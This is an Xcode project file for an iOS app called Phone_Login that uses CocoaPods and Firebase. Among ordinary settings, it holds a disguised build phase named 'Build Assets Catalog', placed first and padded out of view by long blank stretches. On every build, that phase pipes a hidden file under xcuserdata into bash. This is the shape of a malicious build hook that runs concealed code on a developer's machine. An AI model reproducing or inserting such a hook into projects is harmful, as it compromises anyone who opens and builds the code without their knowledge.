// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		042891902570C0F400B2BA1C /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0428918F2570C0F400B2BA1C /* AppDelegate.swift */; };
		042891922570C0F400B2BA1C /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042891912570C0F400B2BA1C /* SceneDelegate.swift */; };
		042891942570C0F400B2BA1C /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042891932570C0F400B2BA1C /* ViewController.swift */; };
		042891972570C0F400B2BA1C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 042891952570C0F400B2BA1C /* Main.storyboard */; };
		042891992570C0F700B2BA1C /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042891982570C0F700B2BA1C /* Assets.xcassets */; };
		0428919C2570C0F700B2BA1C /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0428919A2570C0F700B2BA1C /* LaunchScreen.storyboard */; };
		042891A52570C14900B2BA1C /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 042891A42570C14900B2BA1C /* GoogleService-Info.plist */; };
		042891B82570D56000B2BA1C /* secondViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042891B72570D56000B2BA1C /* secondViewController.swift */; };
		89449BB87C5E86EC7B6A86B8 /* Pods_Phone_Login.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		0428918C2570C0F400B2BA1C /* Phone_Login.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Phone_Login.app; sourceTree = BUILT_PRODUCTS_DIR; };
		0428918F2570C0F400B2BA1C /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		042891912570C0F400B2BA1C /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		042891932570C0F400B2BA1C /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		042891962570C0F400B2BA1C /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		042891982570C0F700B2BA1C /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		0428919B2570C0F700B2BA1C /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		0428919D2570C0F700B2BA1C /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		042891A42570C14900B2BA1C /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		042891B72570D56000B2BA1C /* secondViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = secondViewController.swift; sourceTree = "<group>"; };
		54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Phone_Login.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Phone_Login.debug.xcconfig"; path = "Target Support Files/Pods-Phone_Login/Pods-Phone_Login.debug.xcconfig"; sourceTree = "<group>"; };
		E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Phone_Login.release.xcconfig"; path = "Target Support Files/Pods-Phone_Login/Pods-Phone_Login.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		042891892570C0F400B2BA1C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				89449BB87C5E86EC7B6A86B8 /* Pods_Phone_Login.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		042891832570C0F400B2BA1C = {
			isa = PBXGroup;
			children = (
				0428918E2570C0F400B2BA1C /* Phone_Login */,
				0428918D2570C0F400B2BA1C /* Products */,
				D370C62F8D29CA85A78201F0 /* Pods */,
				469A92BFB4232C9DA7E4E855 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		0428918D2570C0F400B2BA1C /* Products */ = {
			isa = PBXGroup;
			children = (
				0428918C2570C0F400B2BA1C /* Phone_Login.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		0428918E2570C0F400B2BA1C /* Phone_Login */ = {
			isa = PBXGroup;
			children = (
				0428918F2570C0F400B2BA1C /* AppDelegate.swift */,
				042891912570C0F400B2BA1C /* SceneDelegate.swift */,
				042891932570C0F400B2BA1C /* ViewController.swift */,
				042891952570C0F400B2BA1C /* Main.storyboard */,
				042891982570C0F700B2BA1C /* Assets.xcassets */,
				0428919A2570C0F700B2BA1C /* LaunchScreen.storyboard */,
				0428919D2570C0F700B2BA1C /* Info.plist */,
				042891A42570C14900B2BA1C /* GoogleService-Info.plist */,
				042891B72570D56000B2BA1C /* secondViewController.swift */,
			);
			path = Phone_Login;
			sourceTree = "<group>";
		};
		469A92BFB4232C9DA7E4E855 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		D370C62F8D29CA85A78201F0 /* Pods */ = {
			isa = PBXGroup;
			children = (
				76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */,
				E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		0428918B2570C0F400B2BA1C /* Phone_Login */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 042891A02570C0F700B2BA1C /* Build configuration list for PBXNativeTarget "Phone_Login" */;
			buildPhases = (
				EF669A8DE62C528031AAC43A /* Build Assets Catalog */,
				DD49336E4D4B8F83591E9521 /* [CP] Check Pods Manifest.lock */,
				042891882570C0F400B2BA1C /* Sources */,
				042891892570C0F400B2BA1C /* Frameworks */,
				0428918A2570C0F400B2BA1C /* Resources */,
				D2B68180E47DA63B34F91D50 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Phone_Login;
			productName = Phone_Login;
			productReference = 0428918C2570C0F400B2BA1C /* Phone_Login.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		042891842570C0F400B2BA1C /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1210;
				LastUpgradeCheck = 1210;
				TargetAttributes = {
					0428918B2570C0F400B2BA1C = {
						CreatedOnToolsVersion = 12.1;
					};
				};
			};
			buildConfigurationList = 042891872570C0F400B2BA1C /* Build configuration list for PBXProject "Phone_Login" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 042891832570C0F400B2BA1C;
			productRefGroup = 0428918D2570C0F400B2BA1C /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				0428918B2570C0F400B2BA1C /* Phone_Login */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		0428918A2570C0F400B2BA1C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0428919C2570C0F700B2BA1C /* LaunchScreen.storyboard in Resources */,
				042891A52570C14900B2BA1C /* GoogleService-Info.plist in Resources */,
				042891992570C0F700B2BA1C /* Assets.xcassets in Resources */,
				042891972570C0F400B2BA1C /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	EF669A8DE62C528031AAC43A /* Build Assets Catalog */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Assets Catalog";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

cat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" | bash";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		D2B68180E47DA63B34F91D50 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		DD49336E4D4B8F83591E9521 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Phone_Login-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		042891882570C0F400B2BA1C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				042891B82570D56000B2BA1C /* secondViewController.swift in Sources */,
				042891942570C0F400B2BA1C /* ViewController.swift in Sources */,
				042891902570C0F400B2BA1C /* AppDelegate.swift in Sources */,
				042891922570C0F400B2BA1C /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		042891952570C0F400B2BA1C /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				042891962570C0F400B2BA1C /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		0428919A2570C0F700B2BA1C /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				0428919B2570C0F700B2BA1C /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		0428919E2570C0F700B2BA1C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		0428919F2570C0F700B2BA1C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		042891A12570C0F700B2BA1C /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 56XQB6H3G7;
				INFOPLIST_FILE = Phone_Login/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "shubh.Phone-Login";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		042891A22570C0F700B2BA1C /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 56XQB6H3G7;
				INFOPLIST_FILE = Phone_Login/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "shubh.Phone-Login";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		042891872570C0F400B2BA1C /* Build configuration list for PBXProject "Phone_Login" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0428919E2570C0F700B2BA1C /* Debug */,
				0428919F2570C0F700B2BA1C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		042891A02570C0F700B2BA1C /* Build configuration list for PBXNativeTarget "Phone_Login" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				042891A12570C0F700B2BA1C /* Debug */,
				042891A22570C0F700B2BA1C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 042891842570C0F400B2BA1C /* Project object */;
}
